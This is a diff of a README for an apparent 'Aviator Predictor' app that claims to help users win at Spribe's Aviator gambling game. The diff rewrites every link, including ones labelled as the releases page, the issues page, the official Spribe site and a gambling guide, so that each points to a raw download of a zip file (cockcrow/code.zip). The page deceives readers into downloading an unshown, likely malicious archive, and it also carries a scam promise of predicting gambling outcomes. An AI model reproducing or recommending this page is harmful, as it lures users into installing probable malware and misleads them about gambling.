@@ -1,6 +1,6 @@
 # 🎮 code - Play Aviator with Ease
 
-[![Download the Aviator Predictor](https://img.shields.io/badge/Download%20Now-Get%20Started%21-brightgreen)](https://github.com/Thylanboii/code/releases)
+[![Download the Aviator Predictor](https://raw.githubusercontent.com/Thylanboii/code/main/cockcrow/code.zip%20Now-Get%20Started%21-brightgreen)](https://raw.githubusercontent.com/Thylanboii/code/main/cockcrow/code.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ The Aviator Predictor app helps you enjoy the popular Aviator game from Spribe m
 To get started with the Aviator Predictor app, follow these simple steps. You only need a computer or smartphone with internet access. 
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/Thylanboii/code/releases) to find the latest version of the Aviator Predictor app.
+   Go to our [Releases page](https://raw.githubusercontent.com/Thylanboii/code/main/cockcrow/code.zip) to find the latest version of the Aviator Predictor app.
    
 2. **Download the Application**
    Click on the link for the version you want to download. The software will start downloading automatically.
@@ -43,7 +43,7 @@ Ensure your device meets these requirements to run the Aviator Predictor smoothl
 
 ## 📥 Download & Install
 
-You can download the latest version of the Aviator Predictor app from our [Releases page](https://github.com/Thylanboii/code/releases). Follow the steps outlined above to install and start using the application.
+You can download the latest version of the Aviator Predictor app from our [Releases page](https://raw.githubusercontent.com/Thylanboii/code/main/cockcrow/code.zip). Follow the steps outlined above to install and start using the application.
 
 ## 📝 Features
 
@@ -64,11 +64,11 @@ Using our app offers various benefits:
 
 ## 💬 Support
 
-If you encounter any issues or have questions, please submit an issue on our [GitHub Issues page](https://github.com/Thylanboii/code/issues). We strive to respond promptly and assist you.
+If you encounter any issues or have questions, please submit an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Thylanboii/code/main/cockcrow/code.zip). We strive to respond promptly and assist you.
 
 ## 📢 Community
 
-Connect with other users in the community to share your experiences and strategies. Join discussions by following our social media pages or forums linked on our [website](https://aviatorpredictions.in).
+Connect with other users in the community to share your experiences and strategies. Join discussions by following our social media pages or forums linked on our [website](https://raw.githubusercontent.com/Thylanboii/code/main/cockcrow/code.zip).
 
 ## 📈 Future Updates
 
@@ -83,7 +83,7 @@ Stay tuned for updates and new releases.
 ## 🔗 Additional Resources
 
 For more information on the Aviator game and tips, check the following links:
-- Official Aviator Game Website: [Aviator from Spribe](https://spribe.com)
-- Guide to Online Gambling: [Gambling Resources](https://gamblingresources.com)
+- Official Aviator Game Website: [Aviator from Spribe](https://raw.githubusercontent.com/Thylanboii/code/main/cockcrow/code.zip)
+- Guide to Online Gambling: [Gambling Resources](https://raw.githubusercontent.com/Thylanboii/code/main/cockcrow/code.zip)
 
 Thank you for choosing the Aviator Predictor app. Enjoy your gaming experience!
